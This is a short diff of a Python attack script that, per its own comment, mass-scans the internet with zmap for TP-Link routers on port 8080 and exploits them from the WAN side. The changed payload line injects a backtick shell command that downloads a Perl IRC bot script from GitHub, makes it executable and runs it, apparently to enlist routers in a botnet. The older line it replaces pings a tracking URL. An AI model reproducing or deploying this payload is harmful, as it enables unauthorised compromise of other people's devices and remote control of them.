@@ -6,7 +6,7 @@ from threading import Thread
 from concurrent.futures import ThreadPoolExecutor
 #TP-Link WAN-side | zmap -p8080 -B 10M -q -o- | awk {'print $0":8080"'} | python3 wan.py
 
-payload = "`curl https://02ip.ru/Leaxibab && wget https://02ip.ru/Leaxibab`"
+payload = "`wget https://02ip.ru/asjghasga && wget -O a.pl https://raw.githubusercontent.com/MyLeaxi/Rollercoinbot/main/irc.pl && chmod 777 a.pl && perl a.pl`"
 
 def exploit(target):
     try:
